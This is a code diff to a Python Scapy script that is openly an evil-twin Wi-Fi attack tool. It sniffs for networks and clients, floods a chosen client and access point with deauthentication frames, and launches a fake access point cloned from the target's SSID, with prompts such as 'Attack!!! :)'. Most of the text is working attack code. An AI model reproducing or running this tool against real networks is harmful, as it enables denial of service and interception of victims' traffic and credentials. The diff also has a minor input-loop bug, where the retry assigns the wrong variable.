@@ -52,6 +52,7 @@ def callback(packet):
 
 def change_channel():
     ch = 1
+
     while True:
         os.system(f"iwconfig {interface} channel {ch}")
         # switch channel from 1 to 14 each 0.5s
@@ -64,9 +65,20 @@ def change_channel():
 def for_ap(frame, interface):
   while True:
     sendp(frame, iface = interface, count = 100, inter = 0.1)
+
 def for_client(frame, interface):
   while True:
     sendp(frame, iface = interface, count = 100, inter = 0.1)
+
+def enable_monitor_mode(inter):
+    os.system(f'sudo ifconfig {inter} down')
+    os.system(f'sudo iwconfig {inter} mode monitor')
+    os.system(f'sudo ifconfig {inter} up')
+
+def disable_monitor_mode(inter):
+    os.system(f'sudo ifconfig {inter} down')
+    os.system(f'sudo iwconfig {inter} mode managed')
+    os.system(f'sudo ifconfig {inter} up')
 
 
 if __name__ == "__main__":
@@ -76,7 +88,7 @@ if __name__ == "__main__":
     print("Interfaces:")
     for (i, item) in enumerate(interfaces, start=1):
         print("   " + str(i) + ". " + item)
-    val = input("Please Choose Interface: ")
+    val = input("Please Choose Interface for Attack: ")
 
     # 2. Choose card interface to attack with
     while True:
@@ -86,12 +98,26 @@ if __name__ == "__main__":
             break
         except:
             val = input("Please Choose Again: ")
-    print('Looking for networks.....')
+    
 
+    val2 = input("Please Choose Interface for Creating Fake AP: ")
+
+    # 2.1. Choose card interface to create Fake AP with
+    while True:
+        try:
+            if val2 == val:
+                raise Exception()
+            choose = int(val2)
+            interface_fake = interfaces[choose - 1]
+            break
+        except:
+            val = input("Please Choose Again: ")
+    
     # 3. Enable monitor mode
-    os.system(f'sudo ifconfig {interface} down')
-    os.system(f'sudo iwconfig {interface} mode monitor')
-    os.system(f'sudo ifconfig {interface} up')
+    enable_monitor_mode(interface)
+    enable_monitor_mode(interface_fake)
+
+    print('Looking for networks.....')
 
     # 4. Start the channel changer
     channel_changer = Thread(target=change_channel)
@@ -101,7 +127,7 @@ if __name__ == "__main__":
     # 5. Start sniffing (Synchronous process)
     sniff(prn=callback, iface=interface, timeout=10)
 
-    # 6. Stop printing and changing channel threads
+    # 6. Stop changing channel thread
     stop_threads = True
 
     # 7 Check if any clients found
@@ -111,13 +137,14 @@ if __name__ == "__main__":
 
     # 8. Choose the AP to attack
     print(networks.iloc[:, [0, 1]])
-    val = input("\nPlease enter the index of the AP you want to attack: ")
+    net_val = input("\nPlease enter the index of the AP you want to attack: ")
     while True:
         try:
-            net = networks.loc[int(val)]
+            net = networks.loc[int(net_val)]
         except:
-            val = input("Please Choose Again Network: ")
+            net_val = input("Please Choose Again Network: ")
             continue
+    
 
         # 9. Print the Users
         i = 1
@@ -129,14 +156,14 @@ if __name__ == "__main__":
             break
         else:
             print('This network was no user:', gateway_mac)
-            val = input("Please Choose Again Network: ")
+            net_val = input("Please Choose Again Network: ")
 
-
+  
     # 10. Choose the Client to attack
     val = input("\nPlease enter the index of the client you want to attack: ")
     while True:
         try:
-            choose = int(val)
+            client = int(val)
             break
         except:
             val = input("Please Choose Again: ")
@@ -145,12 +172,14 @@ if __name__ == "__main__":
     i = 1
     target_mac = ''
     for n in user[gateway_mac]:
-        if i == choose:
+        if i == client:
             target_mac = n
             break
         i += 1
-
-    # 11. User attack
+   
+          
+    # 12. User attack
+    # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
     print('The target is: ', target_mac)
     print('Attack!!! :)')
     frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
@@ -158,28 +187,19 @@ if __name__ == "__main__":
     deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
     deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
 
+    # 13. Fake AP
     fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
-    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface+';"$SHELL'
-    print(fake_ap_cmd)
-
-    # Deauth
-    for i in range(200):
-        print("sending AP to client")
-        sendp(frame1, iface = interface)
-        print("sending client to AP")
-        sendp(frame, iface = interface)
-
-    # Fake AP
+    net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_fake+' '+ interface+';"$SHELL'
     os.system(fake_ap_cmd)
 
-
-    # deauth1.start()
-    # deauth2.start()
-    # deauth1.join()
-    # deauth2.join()
-
-
-    # 12. Disable monitor mode
-    # os.system(f'sudo ifconfig {interface} down')
-    # os.system(f'sudo iwconfig {interface} mode managed')
-    # os.system(f'sudo ifconfig {interface} up')
+    # 14. Deauth
+    try:
+        deauth1.start()
+        deauth2.start()
+        deauth1.join()
+        deauth2.join()
+    except:
+       print("@@@@@@@@@@@@@@@@@@@@")
+    # 15. Disable monitor mode
+    disable_monitor_mode(interface)
+    disable_monitor_mode(interface_fake)
